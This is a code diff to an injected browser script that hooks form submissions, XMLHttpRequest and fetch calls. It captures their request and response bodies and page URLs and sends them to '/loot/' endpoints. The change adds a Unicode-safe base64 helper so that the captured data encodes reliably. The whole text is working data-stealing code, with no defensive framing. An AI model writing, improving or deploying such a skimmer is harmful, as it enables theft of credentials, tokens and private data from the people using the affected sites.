@@ -15,6 +15,11 @@
   if (window[PREFIX + '_loaded']) return;
   window[PREFIX + '_loaded'] = true;
 
+  // Unicode-safe base64 helpers (btoa/atob only handle Latin-1)
+  function unicodeBtoa(str) {
+    return btoa(String.fromCharCode(...new TextEncoder().encode(str)));
+  }
+
   // ===== Data Buffer =====
   var buffer = [];
 
@@ -89,9 +94,9 @@
         } catch (e) { /* FormData construction failed */ }
 
         emit('/loot/formPost', {
-          action: btoa(action),
+          action: unicodeBtoa(action),
           method: method,
-          data: btoa(data),
+          data: unicodeBtoa(data),
           url: document.location.href
         });
       });
@@ -333,7 +338,7 @@
       var originalOnReady = this.onreadystatechange;
 
       if (this._atomRequestDetails) {
-        try { this._atomRequestDetails.body = btoa(data || ''); }
+        try { this._atomRequestDetails.body = unicodeBtoa(data || ''); }
         catch (e) { this._atomRequestDetails.body = ''; }
       }
 
@@ -353,7 +358,7 @@
               respData = this.responseXML ? this.responseXML.documentElement.outerHTML : '';
             }
 
-            this._atomRequestDetails.responseBody = btoa(respData);
+            this._atomRequestDetails.responseBody = unicodeBtoa(respData);
             this._atomRequestDetails.responseStatus = this.status;
             emit('/loot/xhrRequest', this._atomRequestDetails);
           } catch (e) { /* response capture failed */ }
@@ -405,7 +410,7 @@
         responseStatus: null
       };
 
-      try { requestDetails.body = btoa(body || ''); }
+      try { requestDetails.body = unicodeBtoa(body || ''); }
       catch (e) { requestDetails.body = ''; }
 
       return origFetch.apply(this, arguments).then(function(response) {
@@ -414,7 +419,7 @@
         // Clone response to avoid consuming the body
         var cloned = response.clone();
         cloned.text().then(function(text) {
-          try { requestDetails.responseBody = btoa(text); }
+          try { requestDetails.responseBody = unicodeBtoa(text); }
           catch (e) { requestDetails.responseBody = ''; }
           emit('/loot/fetchRequest', requestDetails);
         }).catch(function() {
